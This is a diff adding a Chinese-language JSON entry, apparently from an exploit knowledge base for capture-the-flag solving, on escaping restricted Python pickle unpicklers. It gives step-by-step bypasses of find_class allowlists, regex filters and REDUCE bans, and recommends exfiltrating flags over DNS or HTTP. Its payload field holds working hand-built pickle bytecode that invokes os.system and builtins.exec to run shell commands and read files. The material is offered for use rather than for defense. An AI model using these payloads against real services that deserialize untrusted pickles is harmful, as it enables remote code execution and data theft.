@@ -1,0 +1,93 @@
+{
+  "id": "misc-pickle-jail-restricted-unpickler",
+  "title": "Pickle 沙箱逃逸:受限 Unpickler / find_class 白名单绕过(经典 GLOBAL/STACK_GLOBAL->REDUCE 拿 RCE;硬变体 REDUCE 被禁时用 BUILD-slotstate 劫持 __getattribute__ 零调用逃逸)",
+  "vuln_pattern": "服务用 pickle.loads 反序列化用户输入, 但套了自定义 Unpickler.find_class 白名单/opcode 过滤/属性名黑名单想'安全反序列化'——手工拼 pickle 字节码, 用允许的 module/attr 组合或绕过残缺过滤触发 REDUCE 达成任意函数执行;当 REDUCE/NEWOBJ 被 die() 禁掉时, 改用 BUILD 的 slotstate 覆写 Unpickler 实例的 __getattribute__ 劫持 find_class 解析链, 零函数调用逃逸",
+  "fingerprint": [
+    "pickle",
+    "unpickle",
+    "pickle.loads",
+    "Unpickler",
+    "find_class",
+    "restricted unpickler",
+    "pickle jail",
+    "pickle sandbox",
+    "反序列化",
+    "REDUCE",
+    "GLOBAL",
+    "STACK_GLOBAL",
+    "opcode",
+    "字节码",
+    "pickletools",
+    "__reduce__",
+    "__reduce_ex__",
+    "allowlist",
+    "whitelist",
+    "白名单",
+    "builtins",
+    "marshal",
+    "dumps",
+    "safe_load",
+    "c opcode",
+    "R opcode",
+    "BUILD",
+    "slotstate",
+    "__getattribute__",
+    "__setattr__",
+    "NEXT_BUFFER",
+    "_buffers",
+    "protocol 5",
+    "REDUCE disabled",
+    "no-call"
+  ],
+  "exploit_steps": [
+    "先判定防护类型:①只过滤 `__reduce__`(阻不了手搓 opcode);②重写 find_class 只放行某些 module/name;③正则黑名单挡关键字(os/system/eval)。用 `pickletools.dis(payload)` 看清目标允许/禁止到 opcode 粒度。",
+    "回顾 pickle 执行模型:栈式 VM。`c`(GLOBAL)按 'module\\nname' 压入一个对象;`\\x93`(STACK_GLOBAL)从栈取两个字符串做同样的事(能绕过对 `c` 后跟明文的正则);`R`(REDUCE)以栈顶元组为参数调用次栈顶可调用对象;`t`/`)`(TUPLE)构参数;`.`(STOP)结束。RCE 本质 = 想办法把一个'可调用+参数'摆上栈然后 R。",
+    "find_class 白名单绕过:若只放行某几个'看着无害'的 module, 找其中能间接拿到执行原语的:`builtins.getattr`/`builtins.__import__`/`builtins.eval`/`builtins.exec`;或经允许模块的属性链走到 os.system(如允许 `os` 的某函数就直接 system;允许 `functools`->reduce 链)。STACK_GLOBAL 用两个 SHORT_BINUNICODE 压 module 与 name, 使黑名单正则(只匹配 `cos\\nsystem`)失效。",
+    "无 __reduce__ 也能打:直接手写字节 payload(不经 pickle.dumps), 用 GLOBAL 取 `os.system`(或 builtins.exec 组更通用), 用 SHORT_BINUNICODE 压命令字符串, TUPLE1 成参, REDUCE 调用, STOP 收尾。python2/3 与 protocol 差异会影响 opcode 字节, 用 pickletools 校验。",
+    "把命令改成外带回显:目标沙箱常无回显——用 exec 读 flag 后经 DNS/HTTP 外带, 或让 system 把 flag 写到能读的位置/直接 `cat flag`。若是'反序列化后比较/渲染'型, 也可构造对象改类属性绕逻辑而非直接 RCE。",
+    "【硬变体:REDUCE/NEWOBJ 被 die() 禁掉,`__reduce__` 这条路彻底断】——此时不靠'调用'逃逸,靠【重编 unpickler 自身】。核心原语是 BUILD(`b`):它对栈顶对象施加 state,`(None, {slotstate})` 形态会把字典逐键 setattr 到该对象上。用它覆写【Unpickler 实例自己】的 `__getattribute__`(实例槽,常不受'只在 self==__main__ 时封 dunder'那类保护约束),就劫持了 `self.find_class`/内部方法的属性解析链——让受限的 find_class 解析成你用 SETITEM 预先植入模块字典的假函数。全程零 REDUCE/零函数调用即完成'受限方法→受控函数'的偷换。",
+    "【名字黑名单只审名、不审解析链——两条通用绕法】①用【未含禁子串的路径】到达执行原语:过滤器按子串拦 `os/exec/open/eval` 时,经名字里不含这些子串的嵌套属性(题目/运行时保留的导入引用、无害命名的中间对象)间接拿到同一能力;②把危险名当【数据】而非名字:构造一个 `exec`/`eval` 调用,把 payload 作为【字符串字面量】传进去——字符串内容永远不过 getattr/find_class,子串黑名单看不到它。别死磕'直接按名字查出 os/exec'——那正是黑名单唯一能拦住的动作。",
+    "【NEXT_BUFFER/`_buffers` 带外走私(protocol 5)】:BUILD 给 unpickler 的 `_buffers` 注入一个 `iter([二级 pickle 字节])`,再用 `\\x97`(NEXT_BUFFER)把这段带外字节推上栈——protocol 5 的 out-of-band 缓冲通道,可做分阶段 payload,绕过只审 opcode 主流的检查。配合上面的 `__getattribute__` 劫持,可把二级载荷喂进被你接管的解析路径。"
+  ],
+  "key_payloads": [
+    "# 手搓 pickle 字节码: os.system('...') —— 不依赖 __reduce__, 绕正则用 STACK_GLOBAL\nimport pickle, pickletools\ncmd = b\"id > /tmp/o\"\np  = b'\\x80\\x04'                         # PROTO 4\np += b'\\x8c\\x02os'                        # SHORT_BINUNICODE 'os'\np += b'\\x8c\\x06system'                    # SHORT_BINUNICODE 'system'\np += b'\\x93'                              # STACK_GLOBAL -> os.system\np += b'\\x8c' + bytes([len(cmd)]) + cmd    # SHORT_BINUNICODE cmd\np += b'\\x85'                              # TUPLE1\np += b'R'                                 # REDUCE  == os.system(cmd)\np += b'.'                                 # STOP\npickletools.dis(p)                        # 校验\n# pickle.loads(p) 触发",
+    "# 更通用: builtins.exec('任意python') —— 沙箱只放行 builtins 时\np  = b'\\x80\\x04\\x8c\\x08builtins\\x8c\\x04exec\\x93'\ncode = b\"import os;open('/tmp/f','w').write(os.popen('cat flag*').read())\"\np += b'\\x8c' + bytes([len(code)]) + code + b'\\x85R.'\n# 若命令 > 255 字节, 用 BINUNICODE '\\x8d'+4字节小端长度 代替 '\\x8c'+1字节",
+    "# 反查防护: 先 dis 官方/题目给的 payload 看它禁到哪一层\nimport pickletools; pickletools.dis(open('sample.pkl','rb').read())\n# find_class 白名单探测: 逐个试被允许的 (module,name), 看哪些能压栈不报错"
+  ],
+  "category": "misc",
+  "cve": [],
+  "tags": [
+    "pickle",
+    "pickle-jail",
+    "restricted-unpickler",
+    "find_class-bypass",
+    "opcode-craft",
+    "stack_global",
+    "reduce",
+    "sandbox-escape",
+    "deserialization"
+  ],
+  "source": "seed: pickle deserialization sandbox methodology",
+  "created_ts": 0.0,
+  "preconditions": [
+    "服务对用户可控数据调用 pickle.loads / 自定义 Unpickler",
+    "存在 find_class 白名单或 opcode/正则过滤想做'安全反序列化', 但过滤不完整或放行了可组合出执行原语的模块"
+  ],
+  "verify_oracle": "构造的 pickle 载入后触发命令执行(落地文件/外带回显/进程行为可观测), 或对象状态被按预期篡改, 最终读到 flag",
+  "pitfalls": [
+    "protocol 版本影响 opcode 字节(SHORT_BINUNICODE 是 proto>=4;老服务可能只吃 proto 0/2)——用 pickletools.dis 对照实际字节",
+    "字符串 >255 字节要用 BINUNICODE(4 字节长度)而非 SHORT_BINUNICODE(1 字节), 否则长度截断解析崩",
+    "只删 __reduce__ 挡不住手搓 opcode;只正则挡 `cos\\nsystem` 挡不住 STACK_GLOBAL——针对具体防护选绕法, 别一把梭",
+    "沙箱常无 stdout 回显:优先 exec 读文件后外带, 别指望 system 的输出直接回来",
+    "python2 vs python3 的 module 名不同(__builtin__ vs builtins), 打错 module 名 find_class 直接拒",
+    "REDUCE/NEWOBJ 被 die() 禁掉时还在死磕'把可调用+参数摆栈再 R'——此路已断:改走 BUILD-slotstate 覆写 Unpickler 实例的 `__getattribute__` 劫持 find_class 解析链(零调用逃逸),别停在'没有可调用原语'的错误结论上",
+    "过滤是【属性名子串黑名单】(拦 os/exec/open 等)却按'直接查出这些名'去打——那正是它唯一拦得住的:用未含禁子串的保留引用间接到达,或把危险名作为字符串数据喂给 exec,名字黑名单对'数据'和'不含禁子串的解析链'都无效",
+    "手搓多阶段 pickle-VM(BUILD/memo 杂耍/NEXT_BUFFER 走私)时逐原语单测全过、端到端拼不出:memo 下标(PUT/GET)与栈序极易错位,且目标自定义 `__setattr__` 会静默拦掉你的调试注入——先在本地复刻 harness 上把【完整链】跑通再打远程,别用远程盲试拼字节;每换一个 opcode 就 pickletools.dis 校验栈状态"
+  ],
+  "anti_fingerprint": [
+    "php",
+    "phar",
+    "readobject"
+  ],
+  "source_tier": "seed"
+}
